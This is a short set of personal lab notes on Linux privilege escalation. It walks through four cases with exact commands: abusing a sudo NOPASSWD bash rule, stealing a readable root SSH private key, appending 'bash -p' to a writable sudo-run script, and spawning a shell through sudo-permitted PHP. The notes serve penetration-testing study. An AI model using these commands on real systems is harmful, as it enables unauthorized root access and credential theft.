# Real-World Linux Privilege Escalation Notes

Hands-on case studies and exact techniques I've used in labs to escalate privileges from low-privilege users to user2 or full `root`.

---

## Key Takeaway / Pattern
PrivEsc almost always follows a clear pattern:
1. Scan manually (`sudo -l`, SUIDs) or run automated tools (`linpeas`).
2. Spot 1 misconfiguration (a binary, key, or script running with elevated rights).
3. Think through how to abuse that specific vector to spawn a shell.

---

## Case 1: Switching Users via Sudo NOPASSWD Bash

### Scenario
Running `sudo -l` revealed that my low-privilege user was allowed to execute `/bin/bash` as `user2` without supplying a password.

### Exploit Command
```bash
sudo -u user2 /bin/bash
```
**Result**: Instantly spawned an interactive shell as `user2`.

---

## Case 2: Root SSH Private Key (`id_rsa`) Theft

### Scenario
Searched the filesystem for SSH private keys:
```bash
find / -name id_rsa 2>/dev/null
```
Found a readable `id_rsa` file belonging to `root`.

### Exploit Steps
1. Copy the raw key text to local Kali machine.
2. Set strict SSH key permissions (SSH refuses to use keys with open permissions):
   ```bash
   chmod 600 id_rsa
   ```
3. Connect directly to root via SSH:
   ```bash
   ssh root@<TARGET_IP> -i id_rsa
   ```
**Result**: Direct root login via SSH key.

---

## Case 3: Hijacking Writable Root Maintenance Script

### Scenario
`sudo -l` showed a maintenance script (`monitor.sh`) could be run as root without password. Checking file permissions (`ls -la monitor.sh`) showed that my current low-privilege user had `rwx` (write) permissions on `monitor.sh`.

### Exploit Steps
Appended a privileged bash shell launcher command into `monitor.sh`:
```bash
echo "bash -p" >> monitor.sh
```
*(Note: `bash -p` spawns a bash shell in privileged mode, maintaining root SUID/eUID).*

Then executed the script with `sudo`:
```bash
sudo /path/to/monitor.sh
```
**Result**: Dropped straight into a root shell. 🥀

---

## Case 4: Sudo PHP Interpreter Shell Execution

### Scenario
`sudo -l` showed my user could run `/usr/bin/php` with `sudo` without password.

### Exploit Command
```bash
sudo php -r 'system("/bin/sh");'
```

### Deep-Dive Breakdown of Payload:
- `sudo`: Required because the `sudo -l` rule grants root execution through sudo.
- `php`: The binary interpreter.
- `-r`: PHP CLI flag for **run string** (executes inline code instead of opening a `.php` file).
- `'system("/bin/sh");'`:
  - `system(...)`: Built-in PHP function that runs an OS command and hooks stdin/stdout directly to our terminal session.
  - `"/bin/sh"`: The shell process we want PHP to execute as root.
  - `;`: Required PHP statement terminator.
  - `'...'`: Outer quotes prevent local shell variable expansion.

**Result**: Instant root shell.
